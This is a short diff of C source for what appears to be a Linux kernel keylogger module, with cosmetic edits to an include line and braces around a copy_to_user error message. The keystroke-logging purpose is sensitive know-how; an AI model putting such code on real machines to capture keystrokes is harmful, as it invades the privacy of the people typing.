@@ -1,4 +1,4 @@
-#include "./keyboard.h"
+#include "keyboard.h"
 
 #define PATH "keylog"
 
@@ -23,9 +23,7 @@ void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t
 		if (!copy_to_user(buffer + **offset, message, msg_len))
 			**offset += msg_len;
 		else
-		{
 			printk(KERN_INFO "copy to user failed \n");
-		}
 	}
 }
 
